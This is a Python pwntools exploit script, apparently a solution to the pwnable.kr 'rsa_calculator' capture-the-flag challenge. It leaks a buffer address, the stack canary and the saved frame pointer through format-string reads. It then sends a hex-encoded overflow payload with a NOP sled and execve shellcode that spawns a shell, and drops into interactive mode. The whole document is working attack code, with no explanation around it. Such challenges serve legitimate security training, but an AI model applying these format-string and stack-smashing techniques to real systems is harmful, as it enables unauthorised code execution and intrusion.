from pwn import *

def set_key_pair():
	pr = 19
	q = 37
	e = 649
	d = 1
	p.sendline("1")

	p.recvuntil("p :")
	p.sendline(str(pr))

	p.recvuntil("q :")
	p.sendline(str(q))

	p.recvuntil("e :")
	p.sendline(str(e))

	p.recvuntil("d :")
	p.sendline(str(d))


def encode(length, data):
	p.sendline("2")

	p.recvuntil("how long is your data?(max=1024) : ")
	p.sendline(str(length))

	p.recvuntil("data")
	p.sendline(data)

	p.recvuntil("-encrypted result (hex encoded) -\n")

	return p.recvline()

def make_data(data):
	tmp = list()
	for i in data:
		tmp.append(str(hex(ord(i))[2:]))
	return '000000'.join(tmp) + '000000'

def make_payload(pay):
	return ''.join(map(lambda i: '%02x' % ord(i), pay))

def decode(length, data):
	p.sendline("3")

	p.recvuntil("how long is your data?(max=1024) : ")
	p.sendline(str(length))

	p.recvuntil("data")
	p.sendline(make_data(data))

	p.recvuntil("- decrypted result -\n")

	return p.recvline().rstrip()


def exp_send(length, data):
	p.sendline("3")

	p.recvuntil("how long is your data?(max=1024) : ")
	p.sendline(str(length))

	p.recvuntil("data")
	p.sendline(data)

	p.recvuntil("- decrypted result -\n")

	return p.recvline().rstrip()

if __name__ == '__main__':
#p = remote("pwnable.kr", 9012)
	p = process("./rsa_calculator")
	shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"\x00"*4

	p.recvuntil(">")
	set_key_pair()
	p.recvuntil(">")
	enc_buf = int(decode(-1,'%34$p'),16)-0xb0
	print "[Enc] : 0x%x" % enc_buf
	canary = int(decode(-1,'%205$p'),16)
	print "[Canary] : 0x%x" % canary
	sfp = int(decode(-1,'%206$p'),16)
	print "[Sfp] : 0x%x" % sfp

	tmp = "ABCDABCD" + p64(canary) + p64(sfp) + p64(enc_buf+200)
	pay = make_payload(make_payload(tmp)) + "\x90" * 128
	pay += shellcode + "\x90"*(1088 - len(shellcode) - len(pay))
	exp_send(-1,pay)
	print pay
	p.interactive()
	p.close()

